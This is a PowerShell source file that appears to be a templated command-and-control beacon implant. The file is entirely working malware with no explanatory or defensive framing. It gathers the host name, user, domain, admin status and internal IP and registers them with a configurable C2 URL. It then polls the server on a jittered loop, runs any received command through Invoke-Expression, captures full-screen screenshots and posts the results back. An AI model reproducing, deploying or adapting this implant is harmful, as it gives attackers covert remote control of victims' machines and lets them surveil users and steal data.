$C2_URL = "{{C2_URL}}"
$BEACON_ID = "{{BEACON_ID}}"
$SLEEP = {{SLEEP}}
$JITTER = {{JITTER}}

$OS_INFO = [System.Environment]::OSVersion.VersionString + " " + [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture

# Collect host info for registration
function Get-HostInfo {
    $info = @{
        beacon_id    = $BEACON_ID
        hostname     = [System.Environment]::MachineName
        username     = [System.Environment]::UserName
        domain       = [System.Environment]::UserDomainName
        os           = $OS_INFO
        arch         = if ([System.Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
        pid          = $PID
        process_name = (Get-Process -Id $PID).ProcessName
        is_admin     = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        internal_ip  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1).IPAddress
    }
    return $info
}

# Register with C2
function Register-Beacon {
    try {
        $Body = Get-HostInfo | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
    } catch {}
}

function Get-CheckIn {
    try {
        $Uri = "$C2_URL/checkin?id=$BEACON_ID"
        $Headers = @{
            "X-Beacon-ID" = $BEACON_ID
            "X-Beacon-OS" = $OS_INFO
        }
        $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers -ErrorAction Stop
        return $Response
    } catch {
        return $null
    }
}

function Send-Result {
    param($TaskID, $Output)
    try {
        $Body = @{
            task_id = $TaskID
            output = $Output
        } | ConvertTo-Json
        Invoke-RestMethod -Uri "$C2_URL/checkin" -Method Post -Body $Body -ContentType "application/json"
    } catch {}
}

function Invoke-Screenshot {
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms

        # Capture all monitors (virtual screen)
        $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $graphics.Dispose()

        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
        $bmp.Dispose()

        $b64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREENSHOT:" + $b64
    } catch {
        return "Error: screenshot failed: " + $_.Exception.Message
    }
}

# Initial registration
Register-Beacon

while ($true) {
    # Sleep with Jitter
    $SleepMs = $SLEEP * 1000
    $JitterMs = $SleepMs * ($JITTER / 100)
    $ActualSleep = $SleepMs + (Get-Random -Min (-$JitterMs) -Max $JitterMs)
    if ($ActualSleep -lt 100) { $ActualSleep = 100 }
    Start-Sleep -Milliseconds $ActualSleep

    $Data = Get-CheckIn

    if ($Data) {
        if ($Data -is [string] -and $Data.StartsWith("SLEEP ")) {
            $Parts = $Data.Split(" ")
            if ($Parts.Length -ge 3) {
                $SLEEP = [int]$Parts[1]
                $JITTER = [int]$Parts[2]
            }
        } elseif ($Data -is [array]) {
            foreach ($Task in $Data) {
                if ($Task.command -eq "__EXIT__") {
                    Send-Result -TaskID $Task.id -Output "BEACON_TERMINATED"
                    exit
                }
                $Output = ""
                try {
                    # Handle built-in commands
                    if ($Task.command -eq "pwd" -or $Task.command -eq "cwd") {
                        $Output = (Get-Location).Path
                    } elseif ($Task.command.StartsWith("cd ")) {
                        $Dir = $Task.command.Substring(3).Trim()
                        Set-Location $Dir
                        $Output = "Changed directory to: " + (Get-Location).Path
                    } elseif ($Task.command -eq "__SCREENSHOT__") {
                        $Output = Invoke-Screenshot
                    } else {
                        $Output = Invoke-Expression $Task.command 2>&1 | Out-String
                    }
                } catch {
                    $Output = $_.Exception.Message
                }
                Send-Result -TaskID $Task.id -Output $Output
            }
        }
    }
}
